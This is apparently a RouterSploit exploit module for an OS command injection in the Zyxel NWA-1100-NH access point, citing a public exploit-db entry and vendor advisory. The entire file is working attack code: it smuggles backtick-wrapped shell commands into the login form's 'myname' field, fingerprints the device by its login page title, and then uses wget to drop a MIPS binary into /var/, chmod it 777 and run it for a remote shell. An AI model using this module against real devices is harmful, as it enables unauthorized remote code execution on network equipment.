from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "NWA-1100 NH Command Injection",
        "authors": (
            "Ahmed Alroky",  # original exploit author
            "GH0st3rs",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/50870",
            "https://download.zyxel.com/NWA1100-NH/firmware/NWA1100-NH_2.12(AASI.3)C0_2.pdf",
            "https://www.zyxel.com/support/OS-command-injection-vulnerability-of-NWA1100-NH-access-point.shtml",
        ),
        "devices": (
            "Zyxel NWA-1100-NH",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def execute(self, command: str) -> str:
        data = {
            "myname": f"ffUfRAgO`{command}`",
            "mypasswd": "test",
            "Submit": "Login"
        }
        headers = {
            "Origin": f"http://{self.target}:{self.port}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Referer": f"http:/{self.target}:{self.port}/login/login.html",
        }

        response = self.http_request(
            method="POST", path="/login/login.html",
            headers=headers, data=data
        )
        if response and response.status_code == 200:
            return response.text
        return ''

    def check(self) -> bool:
        response = self.http_request(method='GET', path="/login/login.html")
        if response and "<title>ZyXEL NWA1100" in response.text and not is_it_honeypot(response):
            return True
        return False

    def run(self):
        if self.check():
            print_success("Target %s:%d seams is vulnerable", self.target, self.port)
            shell(
                self,
                architecture="mipsbe",
                method="wget",
                location="/var/",
                exec_binary=['chmod 777 {}', '{}']
            )
        else:
            print_error("Exploit failed - target %s:%d seems to be not vulnerable", self.target, self.port)
